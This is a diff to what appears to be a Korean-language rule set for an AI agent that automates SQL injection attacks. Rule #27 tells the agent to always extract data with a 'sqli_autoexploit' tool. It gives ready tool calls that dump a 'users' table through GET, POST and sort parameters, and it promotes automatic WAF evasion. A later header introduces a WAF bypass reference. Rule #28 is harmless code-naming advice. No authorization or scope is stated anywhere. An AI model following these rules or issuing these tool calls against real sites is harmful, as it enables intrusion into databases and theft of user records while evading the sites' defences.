@@ -881,29 +881,63 @@ print(f"결과: {''.join(result)}")
 
 RULE #27: SQL 인젝션 데이터 추출 — sqli_autoexploit 반드시 사용 (ABSOLUTE CRITICAL)
 
-  ⛔ 절대 금지: 커스텀 Boolean Oracle while 루프 직접 작성
-  ⛔ 절대 금지: run_python 으로 직접 이진탐색 추출 루프 구현
+  ⛔ 절대 금지: 커스텀 Boolean Oracle while/for 루프 직접 작성
+  ⛔ 절대 금지: extract_string(), extract_char() 같은 커스텀 추출 함수 작성
+  ⛔ 절대 금지: run_python 으로 직접 이진탐색/선형탐색 추출 루프 구현
   ⛔ 절대 금지: OOOO/aaaa 오탐 가능성이 있는 커스텀 추출 코드
+  ⛔ 절대 금지: oracle() 함수 + for c in "abcdefg..." 루프 조합
 
   ✅ 반드시 사용: sqli_autoexploit TOOL_CALL
     → 내부에서 Boolean/Error-based/Time-based 자동 선택
     → WAF 차단 감지 및 자동 폴백
     → OOOOO/aaaa 오탐 사전 방지 로직 내장
+    → GET/POST 파라미터, sort/order 파라미터 모두 지원
 
-  올바른 사용법:
+  올바른 사용법 (sort 파라미터 예시):
     TOOL_CALL:{"name":"sqli_autoexploit","args":{
-      "url": "https://target.com/search",
-      "param": "q",
+      "url": "https://target.com/product/list.php",
+      "param": "sort",
       "method": "GET",
-      "base_value": "1",
+      "base_value": "name",
+      "extra_params": {"pinid": "13294"},
       "dump_table": "users"
     }}
 
-  예외: TOOL_CALL sqli_autoexploit 이 사용 불가하거나 앞의 TOOL_CALL 결과에서
-       명시적으로 커스텀 코드가 필요하다고 나온 경우만 커스텀 코드 허용.
-       이 경우에도 반드시 RULE #26 의 검증 코드를 포함할 것.
+  올바른 사용법 (POST 파라미터 예시):
+    TOOL_CALL:{"name":"sqli_autoexploit","args":{
+      "url": "https://target.com/search.php",
+      "param": "search_text",
+      "method": "POST",
+      "base_value": "golf",
+      "dump_table": "users"
+    }}
+
+  경고: Boolean Oracle 검증 후 반드시 sqli_autoexploit 으로 전환할 것!
+       "Boolean Oracle 확인!" 메시지가 나오면 즉시 sqli_autoexploit 호출.
+       직접 추출 루프를 작성하지 말 것 — 반드시 'aaaaaa' 또는 'OOOOO' 출력이 발생함.
+
+  예외: sqli_autoexploit TOOL_CALL 이 사용 불가하다는 명시적 오류가 발생한 경우만
+       커스텀 코드 허용. 이 경우에도 반드시 RULE #26 의 검증 코드를 포함할 것.
 
   핵심: OOOOO 또는 aaaa 출력이 나오면 즉시 중단하고 sqli_autoexploit 으로 전환
+
+RULE #28: 변수명 충돌 방지 — requests.Session() 변수명 보호 (CRITICAL)
+
+  ⛔ 절대 금지: requests.Session() 을 담은 변수명(주로 s, sess, session)을 다른 용도로 재사용
+  ⛔ 절대 금지: s = difflib.SequenceMatcher(...) — s 를 Session 이외 용도로 사용
+  ⛔ 절대 금지: s = re.compile(...), s = SomeClass(...) 등 s 변수명 재사용
+
+  ✅ 올바른 방법:
+    requests.Session() → 변수명: sess 또는 req_session (전체 스크립트에서 고정)
+    difflib.SequenceMatcher() → 변수명: sm, seq_matcher, differ
+    기타 객체 → 다른 의미있는 변수명 사용
+
+  예시:
+    sess = requests.Session()
+    sm = difflib.SequenceMatcher(None, text_a, text_b)
+    for tag, i1, i2, j1, j2 in sm.get_opcodes():
+        ...
+    r = sess.post(url, data=data)  # sess 는 여전히 Session 객체
 
 === WAF SQLi 우회 빠른 참조 (v6.2.5) ===
 차단된 함수 우회 순서:
